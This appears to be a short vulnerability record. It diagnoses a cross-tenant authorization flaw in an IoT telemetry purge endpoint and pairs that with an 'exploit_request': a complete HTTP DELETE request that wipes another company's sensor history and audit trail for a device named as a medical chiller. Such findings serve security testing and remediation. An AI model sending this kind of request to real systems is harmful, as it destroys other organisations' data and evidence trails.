diagnosis: The telemetry purge endpoint receives deviceId and deletes time-series data from InfluxDB using a delete predicate without verifying whether the caller's tenant owns that device. An attacker can purge historical sensor data and audit trails of another company's IoT infrastructure.
exploit_request:
DELETE /api/telemetry/measurements/purge HTTP/1.1
Host: telemetry.iotcore.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIsIn...
Content-Type: application/json

{
  "deviceId": "dev_medical_chiller_0091",
  "start": "2026-01-01T00:00:00Z"
}
